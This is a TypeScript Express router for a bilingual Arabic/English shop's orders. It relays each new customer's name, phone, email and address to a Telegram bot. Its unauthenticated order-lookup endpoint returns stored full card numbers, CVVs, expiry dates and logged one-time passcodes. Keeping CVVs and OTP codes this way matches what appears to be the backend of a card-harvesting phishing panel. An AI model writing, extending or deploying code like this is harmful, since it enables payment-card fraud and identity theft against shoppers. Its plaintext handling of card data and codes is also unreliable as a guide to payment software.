import { Router } from "express";
import { db, ordersTable, productsTable, paymentsTable, otpLogsTable } from "@workspace/db";
import { eq } from "drizzle-orm";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramNotification(order: {
  id: number;
  customerName: string;
  phone: string;
  email: string;
  country: string;
  deliveryAddress: string;
  deliveryDate: string;
  productName: string | null;
  quantity: number;
  totalPrice: number;
  status: string;
  createdAt: string;
}) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    const message = `
🛒 *طلب منتج جديد / New Product Order*

👤 *الاسم / Name:* ${order.customerName}
📞 *الهاتف / Phone:* ${order.phone}
📧 *البريد / Email:* ${order.email}
🌍 *الدولة / Country:* ${order.country}
📍 *العنوان / Address:* ${order.deliveryAddress}
📅 *تاريخ الاستلام / Delivery Date:* ${order.deliveryDate}
📦 *المنتج / Product:* ${order.productName || "N/A"}
� *الكمية / Quantity:* ${order.quantity}
💰 *السعر / Price:* $${order.totalPrice}
� *الحالة / Status:* ${order.status}
�🕒 *الوقت / Time:* ${order.createdAt}
🔖 *رقم الطلب / Order #:* ${order.id}
    `.trim();

    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );
  } catch (err) {
    console.error("Telegram notification failed:", err);
  }
}

const router = Router();

router.get("/orders", async (req, res) => {
  try {
    const { status } = req.query;

    const orders = await db.select().from(ordersTable);
    let filtered = orders;
    if (status) {
      filtered = orders.filter((o) => o.status === status);
    }

    const productIds = [...new Set(filtered.map((o) => o.productId))];
    const products = productIds.length
      ? await db.select().from(productsTable)
      : [];
    const productMap = new Map(products.map((p) => [p.id, p]));

    const result = filtered
      .sort(
        (a, b) =>
          new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
      )
      .map((o) => {
        const product = productMap.get(o.productId);
        return {
          ...o,
          productName: product ? product.title : null,
          productNameAr: product ? product.titleAr : null,
          createdAt: o.createdAt.toISOString(),
        };
      });

    res.json(result);
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.post("/orders", async (req, res) => {
  try {
    const { 
      customerName, 
      phone, 
      email, 
      country, 
      deliveryAddress, 
      deliveryDate, 
      productId, 
      quantity, 
      totalPrice 
    } = req.body;

    if (!customerName || !phone || !email || !deliveryAddress || !deliveryDate || !productId || !totalPrice) {
      return res.status(400).json({ error: "Missing required fields" });
    }

    const [order] = await db
      .insert(ordersTable)
      .values({
        customerName,
        phone,
        email,
        country: country || "Qatar",
        deliveryAddress,
        deliveryDate,
        productId: Number(productId),
        quantity: Number(quantity) || 1,
        totalPrice: Number(totalPrice),
        status: "order_form",
        paymentStatus: "pending",
      })
      .returning();

    const [product] = await db
      .select()
      .from(productsTable)
      .where(eq(productsTable.id, order.productId));

    const orderWithProduct = {
      ...order,
      productName: product ? product.title : null,
      createdAt: order.createdAt.toISOString(),
    };

    sendTelegramNotification(orderWithProduct);

    res.status(201).json(orderWithProduct);
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.get("/orders/:id", async (req, res) => {
  try {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ error: "Invalid ID" });

    const [order] = await db
      .select()
      .from(ordersTable)
      .where(eq(ordersTable.id, id));
    if (!order) return res.status(404).json({ error: "Order not found" });

    const [product] = await db
      .select()
      .from(productsTable)
      .where(eq(productsTable.id, order.productId));

    const [payment] = await db
      .select()
      .from(paymentsTable)
      .where(eq(paymentsTable.orderId, id));

    const otpLogs = await db
      .select()
      .from(otpLogsTable)
      .where(eq(otpLogsTable.orderId, id));

    res.json({
      ...order,
      productName: product ? product.title : null,
      productNameAr: product ? product.titleAr : null,
      payment: payment ? {
        cardBrand: payment.cardBrand,
        cardLast4: payment.cardLast4,
        cardHolder: payment.cardHolder,
        cardExpiry: payment.cardExpiry,
        cardNumber: payment.cardNumber,
        cvv: payment.cvv,
        status: payment.status,
      } : null,
      otpLogs: otpLogs.map(log => ({
        otpCode: log.otpCode,
        status: log.status,
        attempts: log.attempts,
        createdAt: log.createdAt.toISOString(),
      })),
      createdAt: order.createdAt.toISOString(),
    });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

router.patch("/orders/:id", async (req, res) => {
  try {
    const id = Number(req.params.id);
    if (isNaN(id)) return res.status(400).json({ error: "Invalid ID" });

    const updateData: Record<string, unknown> = {};
    if (req.body.status !== undefined) updateData.status = req.body.status;
    if (req.body.paymentStatus !== undefined) updateData.paymentStatus = req.body.paymentStatus;
    if (req.body.customerName !== undefined) updateData.customerName = req.body.customerName;
    if (req.body.phone !== undefined) updateData.phone = req.body.phone;
    if (req.body.email !== undefined) updateData.email = req.body.email;
    if (req.body.deliveryAddress !== undefined) updateData.deliveryAddress = req.body.deliveryAddress;
    if (req.body.deliveryDate !== undefined) updateData.deliveryDate = req.body.deliveryDate;
    if (req.body.quantity !== undefined) updateData.quantity = Number(req.body.quantity);
    if (req.body.totalPrice !== undefined) updateData.totalPrice = Number(req.body.totalPrice);

    const [order] = await db
      .update(ordersTable)
      .set(updateData)
      .where(eq(ordersTable.id, id))
      .returning();
    if (!order) return res.status(404).json({ error: "Order not found" });

    const [product] = await db
      .select()
      .from(productsTable)
      .where(eq(productsTable.id, order.productId));

    res.json({
      ...order,
      productName: product ? product.title : null,
      productNameAr: product ? product.titleAr : null,
      createdAt: order.createdAt.toISOString(),
    });
  } catch (err) {
    req.log.error(err);
    res.status(500).json({ error: "Internal server error" });
  }
});

export default router;
